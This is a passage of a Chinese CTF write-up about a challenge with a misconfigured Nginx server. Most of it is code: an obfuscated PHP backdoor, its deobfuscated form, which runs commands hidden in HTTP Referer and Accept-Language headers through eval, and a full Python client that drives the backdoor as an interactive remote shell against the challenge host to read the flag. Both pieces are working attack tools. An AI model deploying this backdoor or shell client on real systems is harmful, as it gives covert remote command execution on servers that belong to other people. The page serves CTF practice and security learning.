+$U=<span class="hljs-string">&apos;_/|U&quot;,&quot;/-/|U&quot;),ar|Uray|U(&quot;/|U&quot;,&quot;+&quot;),$ss(|U$s[$i]|U,0,$e)|U)),$k))|U|U);$o|U|U=o|Ub_get_|Ucontents(|U);|Uob_end_cle&apos;</span>;
+$q=<span class="hljs-string">&apos;s[|U$i]=&quot;&quot;;$p=|U$ss($p,3);}|U|Uif(array_k|Uey_|Uexis|Uts($|Ui,$s)){$s[$i].=|U$p|U;|U$e=|Ustrpos($s[$i],$f);|Ui&apos;</span>;
+$M=<span class="hljs-string">&apos;l=&quot;strtolower|U&quot;;$i=$m|U[1|U][0].$m[1]|U[1];$|U|Uh=$sl($ss(|Umd5($i|U.$kh),|U0,3|U));$f=$s|Ul($ss(|Umd5($i.$&apos;</span>;
+$z=<span class="hljs-string">&apos;r=@$r[|U&quot;HTTP_R|UEFERER|U&quot;];$r|U|Ua=@$r[&quot;HTTP_A|U|UCCEPT_LAN|UGUAGE|U&quot;];if|U($r|Ur&amp;|U&amp;$ra){$u=parse_|Uurl($r&apos;</span>;
+$k=<span class="hljs-string">&apos;?:;q=0.([\\|Ud]))?,|U?/&quot;,$ra,$m)|U;if($|Uq&amp;&amp;$m){|U|U|U@session_start()|U|U;$s=&amp;$_SESSIO|UN;$ss=&quot;|Usubst|Ur&quot;;|U|U$s&apos;</span>;
+$o=<span class="hljs-string">&apos;|U$l;|U){for|U($j=0;($j|U&lt;$c&amp;&amp;|U|U$i|U&lt;$|Ul);$j++,$i++){$o.=$t{$i}|U^$k|U{$j};}}|Ureturn $|Uo;}$r=$|U_SERV|UE|UR;$r&apos;</span>;
+$N=<span class="hljs-string">&apos;|Uf($e){$k=$k|Uh.$kf|U;ob_sta|Urt();|U@eva|Ul(@g|Uzuncom|Upress(@x(@|Ubas|U|Ue64_decode(preg|U_repla|Uce(|Uarray(&quot;/&apos;</span>;
+$C=<span class="hljs-string">&apos;an();$d=b|Uase64_encode(|Ux|U(gzcomp|U|Uress($o),$k))|U;prin|Ut(&quot;|U&lt;$k&gt;$d&lt;/$k&gt;&quot;|U);@ses|U|Usion_des|Utroy();}}}}&apos;</span>;
+$j=<span class="hljs-string">&apos;$k|Uh=&quot;|U|U42f7&quot;;$kf=&quot;e9ac&quot;;fun|Uction|U |Ux($t,$k){$c|U=|Ustrlen($k);$l=s|Utrl|Ue|Un($t);$o=|U&quot;&quot;;fo|Ur($i=0;$i&lt;&apos;</span>;
+$R=str_replace(<span class="hljs-string">&apos;rO&apos;</span>,<span class="hljs-string">&apos;&apos;</span>,<span class="hljs-string">&apos;rOcreatrOe_rOrOfurOncrOtion&apos;</span>);
+$J=<span class="hljs-string">&apos;kf|U),|U0,3));$p=&quot;|U&quot;;for(|U|U$|Uz=1;$z&lt;cou|Unt|U($m[1]);|U$z++)$p.=|U$q[$m[2][$z|U]|U];if(strpos(|U$|U|Up,$h)|U===0){$&apos;</span>;
+$x=<span class="hljs-string">&apos;r)|U;pa|Urse|U_str($u[&quot;qu|U|Uery&quot;],$q);$|U|Uq=array_values(|U$q);pre|Ug|U_match_al|Ul(&quot;/([\\|U|Uw])[|U\\w-]+|U(&apos;</span>;
+$f=str_replace(<span class="hljs-string">&apos;|U&apos;</span>,<span class="hljs-string">&apos;&apos;</span>,$j.$o.$z.$x.$k.$M.$J.$q.$N.$U.$C);
+$g=create_function(<span class="hljs-string">&apos;&apos;</span>,$f);
+$g();
+<span class="hljs-meta">?&gt;</span>
+</code></pre>
+<p>&#x53EA;&#x80FD;&#x5927;&#x6982;&#x770B;&#x61C2;&#x6700;&#x540E;&#x4E09;&#x884C;&#x5728;&#x5E72;&#x561B;</p>
+<p>&#x628A;$f&#x6253;&#x5370;&#x51FA;&#x6765;&#x770B;&#x770B;</p>
+<pre><code class="lang-php">$kh=<span class="hljs-string">&quot;42f7&quot;</span>;$kf=<span class="hljs-string">&quot;e9ac&quot;</span>;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">x</span><span class="hljs-params">($t,$k)</span></span>{$c=strlen($k);$l=strlen($t);$o=<span class="hljs-string">&quot;&quot;</span>;<span class="hljs-keyword">for</span>($i=<span class="hljs-number">0</span>;$i&lt;$l;){<span class="hljs-keyword">for</span>($j=<span class="hljs-number">0</span>;($j&lt;$c&amp;&amp;$i&lt;$l);$j++,$i++){$o.=$t{$i}^$k{$j};}}<span class="hljs-keyword">return</span> $o;}$r=$_SERVER;$rr=@$r[<span class="hljs-string">&quot;HTTP_REFERER&quot;</span>];$ra=@$r[<span class="hljs-string">&quot;HTTP_ACCEPT_LANGUAGE&quot;</span>];<span class="hljs-keyword">if</span>($rr&amp;&amp;$ra){$u=parse_url($rr);parse_str($u[<span class="hljs-string">&quot;query&quot;</span>],$q);$q=array_values($q);preg_match_all(<span class="hljs-string">&quot;/([\w])[\w-]+(?:;q=0.([\d]))?,?/&quot;</span>,$ra,$m);<span class="hljs-keyword">if</span>($q&amp;&amp;$m){@session_start();$s=&amp;$_SESSION;$ss=<span class="hljs-string">&quot;substr&quot;</span>;$sl=<span class="hljs-string">&quot;strtolower&quot;</span>;$i=$m[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>].$m[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>];$h=$sl($ss(md5($i.$kh),<span class="hljs-number">0</span>,<span class="hljs-number">3</span>));$f=$sl($ss(md5($i.$kf),<span class="hljs-number">0</span>,<span class="hljs-number">3</span>));$p=<span class="hljs-string">&quot;&quot;</span>;<span class="hljs-keyword">for</span>($z=<span class="hljs-number">1</span>;$z&lt;count($m[<span class="hljs-number">1</span>]);$z++)$p.=$q[$m[<span class="hljs-number">2</span>][$z]];<span class="hljs-keyword">if</span>(strpos($p,$h)===<span class="hljs-number">0</span>){$s[$i]=<span class="hljs-string">&quot;&quot;</span>;$p=$ss($p,<span class="hljs-number">3</span>);}<span class="hljs-keyword">if</span>(array_key_exists($i,$s)){$s[$i].=$p;$e=strpos($s[$i],$f);<span class="hljs-keyword">if</span>($e){$k=$kh.$kf;ob_start();@<span class="hljs-keyword">eval</span>(@gzuncompress(@x(@base64_decode(preg_replace(<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;/_/&quot;</span>,<span class="hljs-string">&quot;/-/&quot;</span>),<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;/&quot;</span>,<span class="hljs-string">&quot;+&quot;</span>),$ss($s[$i],<span class="hljs-number">0</span>,$e))),$k)));$o=ob_get_contents();ob_end_clean();$d=base64_encode(x(gzcompress($o),$k));<span class="hljs-keyword">print</span>(<span class="hljs-string">&quot;&lt;$k&gt;$d&lt;/$k&gt;&quot;</span>);@session_destroy();}}}}
+</code></pre>
+<p>&#x770B;&#x8D77;&#x6765;&#x50CF;&#x4E2A;&#x540E;&#x95E8;</p>
+<p>&#x6700;&#x540E;&#x627E;&#x5230;&#x4E86;&#x73B0;&#x6210;&#x7684;&#x5229;&#x7528;&#x811A;&#x672C;</p>
+<pre><code class="lang-python"><span class="hljs-comment"># encoding: utf-8</span>
+
+<span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> randint,choice
+<span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> md5
+<span class="hljs-keyword">import</span> urllib
+<span class="hljs-keyword">import</span> string
+<span class="hljs-keyword">import</span> zlib
+<span class="hljs-keyword">import</span> base64
+<span class="hljs-keyword">import</span> requests
+<span class="hljs-keyword">import</span> re
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">choicePart</span><span class="hljs-params">(seq,amount)</span>:</span>
+    length = len(seq)
+    <span class="hljs-keyword">if</span> length == <span class="hljs-number">0</span> <span class="hljs-keyword">or</span> length &lt; amount:
+        <span class="hljs-keyword">print</span> <span class="hljs-string">&apos;Error Input&apos;</span>
+        <span class="hljs-keyword">return</span> <span class="hljs-keyword">None</span>
+    result = []
+    indexes = []
+    count = <span class="hljs-number">0</span>
+    <span class="hljs-keyword">while</span> count &lt; amount:
+        i = randint(<span class="hljs-number">0</span>,length<span class="hljs-number">-1</span>)
+        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> i <span class="hljs-keyword">in</span> indexes:
+            indexes.append(i)
+            result.append(seq[i])
+            count += <span class="hljs-number">1</span>
+            <span class="hljs-keyword">if</span> count == amount:
+                <span class="hljs-keyword">return</span> result
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">randBytesFlow</span><span class="hljs-params">(amount)</span>:</span>
+    result = <span class="hljs-string">&apos;&apos;</span>
+    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(amount):
+        result += chr(randint(<span class="hljs-number">0</span>,<span class="hljs-number">255</span>))
+    <span class="hljs-keyword">return</span>  result
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">randAlpha</span><span class="hljs-params">(amount)</span>:</span>
+    result = <span class="hljs-string">&apos;&apos;</span>
+    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(amount):
+        result += choice(string.ascii_letters)
+    <span class="hljs-keyword">return</span> result
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">loopXor</span><span class="hljs-params">(text,key)</span>:</span>
+    result = <span class="hljs-string">&apos;&apos;</span>
+    lenKey = len(key)
+    lenTxt = len(text)
+    iTxt = <span class="hljs-number">0</span>
+    <span class="hljs-keyword">while</span> iTxt &lt; lenTxt:
+        iKey = <span class="hljs-number">0</span>
+        <span class="hljs-keyword">while</span> iTxt&lt;lenTxt <span class="hljs-keyword">and</span> iKey&lt;lenKey:
+            result += chr(ord(key[iKey]) ^ ord(text[iTxt]))
+            iTxt += <span class="hljs-number">1</span>
+            iKey += <span class="hljs-number">1</span>
+    <span class="hljs-keyword">return</span> result
+
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debugPrint</span><span class="hljs-params">(msg)</span>:</span>
+    <span class="hljs-keyword">if</span> debugging:
+        <span class="hljs-keyword">print</span> msg
+
+<span class="hljs-comment"># config</span>
+debugging = <span class="hljs-keyword">False</span>
+keyh = <span class="hljs-string">&quot;42f7&quot;</span> <span class="hljs-comment"># $kh</span>
+keyf = <span class="hljs-string">&quot;e9ac&quot;</span> <span class="hljs-comment"># $kf</span>
+xorKey = keyh + keyf
+url = <span class="hljs-string">&apos;http://111.198.29.45:38329/hack.php&apos;</span>
+defaultLang = <span class="hljs-string">&apos;zh-CN&apos;</span>
+languages = [<span class="hljs-string">&apos;zh-TW;q=0.%d&apos;</span>,<span class="hljs-string">&apos;zh-HK;q=0.%d&apos;</span>,<span class="hljs-string">&apos;en-US;q=0.%d&apos;</span>,<span class="hljs-string">&apos;en;q=0.%d&apos;</span>]
+proxies = <span class="hljs-keyword">None</span> <span class="hljs-comment"># {&apos;http&apos;:&apos;http://127.0.0.1:8080&apos;} # proxy for debug</span>
+
+sess = requests.Session()
+
+<span class="hljs-comment"># generate random Accept-Language only once each session</span>
+langTmp = choicePart(languages,<span class="hljs-number">3</span>)
+indexes = sorted(choicePart(range(<span class="hljs-number">1</span>,<span class="hljs-number">10</span>),<span class="hljs-number">3</span>), reverse=<span class="hljs-keyword">True</span>)
+
+acceptLang = [defaultLang]
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(<span class="hljs-number">3</span>):
+    acceptLang.append(langTmp[i] % (indexes[i],))
+acceptLangStr = <span class="hljs-string">&apos;,&apos;</span>.join(acceptLang)
+debugPrint(acceptLangStr)
+
+init2Char = acceptLang[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>] + acceptLang[<span class="hljs-number">1</span>][<span class="hljs-number">0</span>] <span class="hljs-comment"># $i</span>
+md5head = (md5(init2Char + keyh).hexdigest())[<span class="hljs-number">0</span>:<span class="hljs-number">3</span>]
+md5tail = (md5(init2Char + keyf).hexdigest())[<span class="hljs-number">0</span>:<span class="hljs-number">3</span>] + randAlpha(randint(<span class="hljs-number">3</span>,<span class="hljs-number">8</span>))
+debugPrint(<span class="hljs-string">&apos;$i is %s&apos;</span> % (init2Char))
+debugPrint(<span class="hljs-string">&apos;md5 head: %s&apos;</span> % (md5head,))
+debugPrint(<span class="hljs-string">&apos;md5 tail: %s&apos;</span> % (md5tail,))
+
+<span class="hljs-comment"># Interactive php shell</span>
+cmd = raw_input(<span class="hljs-string">&apos;phpshell &gt; &apos;</span>)
+<span class="hljs-keyword">while</span> cmd != <span class="hljs-string">&apos;&apos;</span>:
+    <span class="hljs-comment"># build junk data in referer</span>
+    query = []
+    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(max(indexes)+<span class="hljs-number">1</span>+randint(<span class="hljs-number">0</span>,<span class="hljs-number">2</span>)):
+        key = randAlpha(randint(<span class="hljs-number">3</span>,<span class="hljs-number">6</span>))
+        value = base64.urlsafe_b64encode(randBytesFlow(randint(<span class="hljs-number">3</span>,<span class="hljs-number">12</span>)))
+        query.append((key, value))
+    debugPrint(<span class="hljs-string">&apos;Before insert payload:&apos;</span>)
+    debugPrint(query)
+    debugPrint(urllib.urlencode(query))
+
+    <span class="hljs-comment"># encode payload</span>
+    payload = zlib.compress(cmd)
+    payload = loopXor(payload,xorKey)
+    payload = base64.urlsafe_b64encode(payload)
+    payload = md5head + payload
+
+    <span class="hljs-comment"># cut payload, replace into referer</span>
+    cutIndex = randint(<span class="hljs-number">2</span>,len(payload)<span class="hljs-number">-3</span>)
+    payloadPieces = (payload[<span class="hljs-number">0</span>:cutIndex], payload[cutIndex:], md5tail)
+    iPiece = <span class="hljs-number">0</span>
+    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> indexes:
+        query[i] = (query[i][<span class="hljs-number">0</span>],payloadPieces[iPiece])
+        iPiece += <span class="hljs-number">1</span>
+    referer = url + <span class="hljs-string">&apos;?&apos;</span> + urllib.urlencode(query)
+    debugPrint(<span class="hljs-string">&apos;After insert payload, referer is:&apos;</span>)
+    debugPrint(query)
+    debugPrint(referer)
+
+    <span class="hljs-comment"># send request</span>
+    r = sess.get(url,headers={<span class="hljs-string">&apos;Accept-Language&apos;</span>:acceptLangStr,<span class="hljs-string">&apos;Referer&apos;</span>:referer},proxies=proxies)
+    html = r.text
+    debugPrint(html)
+
+    <span class="hljs-comment"># process response</span>
+    pattern = re.compile(<span class="hljs-string">r&apos;&lt;%s&gt;(.*)&lt;/%s&gt;&apos;</span> % (xorKey,xorKey))
+    output = pattern.findall(html)
+    <span class="hljs-keyword">if</span> len(output) == <span class="hljs-number">0</span>:
+        <span class="hljs-keyword">print</span> <span class="hljs-string">&apos;Error,  no backdoor response&apos;</span>
+        cmd = raw_input(<span class="hljs-string">&apos;phpshell &gt; &apos;</span>)
+        <span class="hljs-keyword">continue</span>
+    output = output[<span class="hljs-number">0</span>]
+    debugPrint(output)
+    output = output.decode(<span class="hljs-string">&apos;base64&apos;</span>)
+    output = loopXor(output,xorKey)
+    output = zlib.decompress(output)
+    <span class="hljs-keyword">print</span> output
+    cmd = raw_input(<span class="hljs-string">&apos;phpshell &gt; &apos;</span>)
+</code></pre>
+<p>&#x6CE8;&#x610F;&#x662F;phpshell</p>
+<p>&#x7528;system(&quot;cat fl*&quot;)</p>
+<pre><code class="lang-python">phpshell &gt; system(&quot;cat fl*&quot;);  
+&lt;?php 
+$flag=&quot;ctf{a57b3698-eeae-48c0-a669-bafe3213568c}&quot;;
+?&gt;
+</code></pre>
+<p>&#x62FF;&#x5230;flag</p>
+<h3 id="&#x53C2;&#x8003;&#x8D44;&#x6599;"><a name="&#x53C2;&#x8003;&#x8D44;&#x6599;" class="anchor-navigation-ex-anchor" href="#&#x53C2;&#x8003;&#x8D44;&#x6599;"><i class="fa fa-link" aria-hidden="true"></i></a>&#x53C2;&#x8003;&#x8D44;&#x6599;</h3>
+<p>Nginx&#x914D;&#x7F6E;&#x5B89;&#x5168;: <a href="https://www.leavesongs.com/PENETRATION/nginx-insecure-configuration.html" target="_blank">https://www.leavesongs.com/PENETRATION/nginx-insecure-configuration.html</a></p>
+<p>&#x6587;&#x4E2D;&#x7684;php&#x540E;&#x95E8;&#x5206;&#x6790;<a href="https://www.cnblogs.com/go2bed/p/5920811.html" target="_blank">https://www.cnblogs.com/go2bed/p/5920811.html</a> </p>
+<footer class="page-footer"><span class="copyright">&#xA9; Eki&apos;s CTF-notes 2019-2021 CC-by-nc-sa 4.0&#x3002; all right reserved&#xFF0C;powered by Gitbook</span><span class="footer-modification">&#x672C;&#x7F51;&#x7AD9;&#x6700;&#x540E;&#x4FEE;&#x8BA2;&#x4E8E;&#xFF1A;
+2021-05-07 16:30:35
+</span></footer> <link rel="stylesheet" type="text/css" href="https://storage.googleapis.com/app.klipse.tech/css/codemirror.css"> <script>     window.klipse_settings = {         selector: ".language-klipse, .lang-eval-clojure",         selector_eval_js: ".lang-eval-js",         selector_eval_python_client: ".lang-eval-python",         selector_eval_php: ".lang-eval-php",         selector_eval_scheme: ".lang-eval-scheme",         selector_eval_ruby: ".lang-eval-ruby",         selector_reagent: ".lang-reagent",        selector_google_charts: ".lang-google-chart",        selector_es2017: ".lang-eval-es2017",        selector_jsx: ".lang-eval-jsx",        selector_transpile_jsx: ".lang-transpile-jsx",        selector_render_jsx: ".lang-render-jsx",        selector_react: ".lang-react",        selector_eval_markdown: ".lang-render-markdown",        selector_eval_lambdaway: ".lang-render-lambdaway",        selector_eval_cpp: ".lang-eval-cpp",        selector_eval_html: ".lang-render-html",        selector_sql: ".lang-eval-sql",        selector_brainfuck: "lang-eval-brainfuck",        selector_js: ".lang-transpile-cljs"    }; </script> <script src="https://storage.googleapis.com/app.klipse.tech/plugin/js/klipse_plugin.js"></script>
+                                
+                                </section>
+                            
+    </div>
+    <div class="search-results">
+        <div class="has-results">
+            
+            <h1 class="search-results-title"><span class='search-results-count'></span> results matching "<span class='search-query'></span>"</h1>
+            <ul class="search-results-list"></ul>
+            
+        </div>
+        <div class="no-results">
+            
+            <h1 class="search-results-title">No results matching "<span class='search-query'></span>"</h1>
+            
+        </div>
+    </div>
+</div>
+
+                        </div>
+                    </div>
+                
+            </div>
+
+            
+                
+                <a href="web_php_unserialize.html" class="navigation navigation-prev " aria-label="Previous page: Web_php_unserialize">
+                    <i class="fa fa-angle-left"></i>
+                </a>
+                
+                
+                <a href="web_python_template_injection.html" class="navigation navigation-next " aria-label="Next page: Web_python_template_injection">
+                    <i class="fa fa-angle-right"></i>
+                </a>
+                
+            
+        
+    </div>
+
+    <script>
+        var gitbook = gitbook || [];
+        gitbook.push(function() {
+            gitbook.page.hasChanged({"page":{"title":"web_php_wrong_nginx_config","level":"1.4.13","depth":2,"next":{"title":"Web_python_template_injection","level":"1.4.14","depth":2,"path":"adworld/web_python_template_injection.md","ref":"adworld/web_python_template_injection.md","articles":[]},"previous":{"title":"Web_php_unserialize","level":"1.4.12","depth":2,"path":"adworld/web_php_unserialize.md","ref":"adworld/web_php_unserialize.md","articles":[]},"dir":"ltr"},"config":{"plugins":["expandable-chapters","splitter","katex","tbfed-pagefooter","theme-comscore","anchor-navigation-ex","-lunr","-search","search-plus","custom-favicon","ga","multipart","advanced-emoji","github","-sharing","sharing-plus","klipse","donate","pageview-count","code","lightbox","auto-scroll-table"],"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"pluginsConfig":{"tbfed-pagefooter":{"copyright":"&copy Eki's CTF-notes 2019-2021 CC-by-nc-sa 4.0。","modify_label":"本网站最后修订于：","modify_format":"YYYY-MM-DD HH:mm:ss"},"github":{"url":"https://github.com/ekixu"},"splitter":{},"sharing-plus":{"qq":false,"all":["facebook","google","twitter","instapaper","linkedin","pocket","stumbleupon"],"douban":false,"facebook":true,"weibo":false,"instapaper":false,"whatsapp":false,"hatenaBookmark":false,"twitter":true,"messenger":false,"line":false,"vk":false,"pocket":true,"google":false,"viber":false,"stumbleupon":false,"qzone":false,"linkedin":false},"auto-scroll-table":{},"multipart":{},"code":{"copyButtons":true},"donate":{"alipay":"https://ctf.ieki.xyz/assets/images/alipay.jpg","alipayText":"支付宝打赏","button":"赏","title":"","wechat":"https://ctf.ieki.xyz/assets/images/wechat.jpg","wechatText":"微信打赏"},"katex":{},"fontsettings":{"theme":"white","family":"sans","size":2},"highlight":{},"anchor-navigation-ex":{"associatedWithSummary":false,"float":{"floatIcon":"fa fa-navicon","level1Icon":"fa fa-hand-o-right","level2Icon":"fa fa-hand-o-right","level3Icon":"fa fa-hand-o-right","showLevelIcon":false},"mode":"float","multipleH1":true,"pageTop":{"level1Icon":"","level2Icon":"","level3Icon":"","showLevelIcon":false},"printLog":false,"showGoTop":true,"showLevel":false},"favicon":"/assets/images/favicon.ico","lightbox":{"jquery":true,"sameUuid":false},"theme-comscore":{},"pageview-count":{},"custom-favicon":{},"ga":{"configuration":"auto","token":"UA-156105693-2"},"klipse":{"myConfigKey":"it's the default value"},"advanced-emoji":{"embedEmojis":false},"sharing":{"qq":false,"all":["douban","facebook","google","instapaper","linkedin","twitter","weibo","messenger","qq","qzone","viber","whatsapp"],"douban":false,"facebook":false,"weibo":true,"twitter":true,"pocket":false,"google":true,"qzone":true},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false},"expandable-chapters":{},"search-plus":{}},"theme":"default","author":"Eki","pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"variables":{},"title":"Eki's CTF","links":{"sidebar":{"主站 Eki's Blog":"https://ieki.xyz"}},"gitbook":"*","description":"CTF笔记"},"file":{"path":"adworld/web_php_wrong_nginx_config.md","mtime":"2021-05-07T08:30:35.917Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2021-05-07T08:31:26.574Z"},"basePath":"..","book":{"language":""}});
+        });
+    </script>
+</div>
+
+        
+    <script src="../gitbook/gitbook.js"></script>
+    <script src="../gitbook/theme.js"></script>
+    
+        
+        <script src="../gitbook/gitbook-plugin-expandable-chapters/expandable-chapters.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-splitter/splitter.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-search-plus/jquery.mark.min.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-search-plus/search.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-ga/plugin.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-github/plugin.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-sharing-plus/buttons.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-donate/plugin.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-pageview-count/plugin.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-code/plugin.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-lightbox/js/lightbox.min.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-auto-scroll-table/plugin.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-fontsettings/fontsettings.js"></script>
+        
+    
+        
+        <script src="../gitbook/gitbook-plugin-theme-comscore/test.js"></script>
+        
+    
+
+    </body>
+</html>
+
